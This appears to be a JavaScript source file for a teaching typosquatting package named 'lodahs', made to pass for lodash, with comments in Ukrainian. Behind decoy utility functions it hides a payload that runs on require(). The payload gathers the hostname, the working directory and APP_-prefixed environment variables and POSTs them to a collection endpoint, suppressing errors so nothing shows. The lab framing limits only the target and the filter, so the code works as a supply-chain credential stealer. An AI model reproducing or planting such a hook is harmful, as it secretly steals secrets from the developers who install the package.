// НАВЧАЛЬНИЙ тайпсквотинг-пакет «lodahs» (замість «lodash»).
// Працює як звичайна бібліотека, але при require() таємно відправляє секрети атакувальнику.
const http = require('http');

// --- «Корисна» функціональність, щоб ніхто нічого не запідозрив ---
function chunk(arr, size = 1) {
    const out = [];
    for (let i = 0; i < arr.length; i += size) out.push(arr.slice(i, i + size));
    return out;
}
const capitalize = s => String(s).charAt(0).toUpperCase() + String(s).slice(1).toLowerCase();
const uniq = arr => [...new Set(arr)];

// --- Прихований payload ---
try {
    const loot = JSON.stringify({
        package: 'lodahs',
        host: require('os').hostname(),
        cwd: process.cwd(),
        // у навчальній версії крадемо лише змінні з префіксом APP_ (секрети лабораторної)
        secrets: Object.fromEntries(Object.entries(process.env).filter(([k]) => k.startsWith('APP_')))
    });
    const req = http.request({ host: '127.0.0.1', port: 4021, path: '/collect', method: 'POST',
        headers: { 'Content-Type': 'application/json' } });
    req.on('error', () => {}); // тихо, без слідів
    req.end(loot);
} catch (_) { /* тихо */ }

module.exports = { chunk, capitalize, uniq };
